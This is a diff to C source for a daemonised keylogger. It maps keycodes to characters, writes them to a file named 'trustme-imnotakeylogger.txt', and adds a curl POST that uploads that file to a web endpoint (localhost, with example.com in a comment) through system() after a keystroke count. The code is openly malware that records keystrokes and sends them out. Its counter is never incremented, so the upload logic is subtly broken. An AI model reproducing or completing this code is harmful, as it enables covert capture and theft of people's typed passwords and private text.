@@ -19,6 +19,11 @@
 #include <string.h>
 
 
+#define AMOUNT_CHARS 25 //How many keystrokes are needed to send the key logs
+#define PATH "https://localhost/api/file"
+
+
+
 static const char *us_keymap[][2] = {
 	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
 	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
@@ -145,20 +150,27 @@ int main()
 {
     skeleton_daemon();
     syslog (LOG_NOTICE, "Keylogger working correctly");
-    FILE * keylog; 
-    int auxkey, key;
-    char cadaux[20];
+    FILE * keylog;
+    char curl_command[200]=""; 
+    sprintf(curl_command, "curl -X POST --data '@trustme-imnotakeylogger.txt' %s",PATH);
+    int auxkey, key, amount=0;
     key = auxkey = -999; 
     keylog = fopen("trustme-imnotakeylogger.txt","wt");
         while (1)    { //will only stop when the daemon dies
-            while(auxkey == key) {
+            while(auxkey == key) 
               key = keycode_of_key_being_pressed(); // key would be an int like 31 for example, that is an 's'
-
-            }
             auxkey = key;
             const char *us_translated_key = us_keymap[auxkey][0];
             if (key>0) 
               fprintf(keylog,"%c", *us_translated_key);
+            if (amount >= 25){
+              amount = 0;
+              system(curl_command);
+
+              //curl -X POST https://example.com/process --data 
+
+              //send the last AMOUNT_CHARS!
+            }
             fflush(keylog);
         }
 
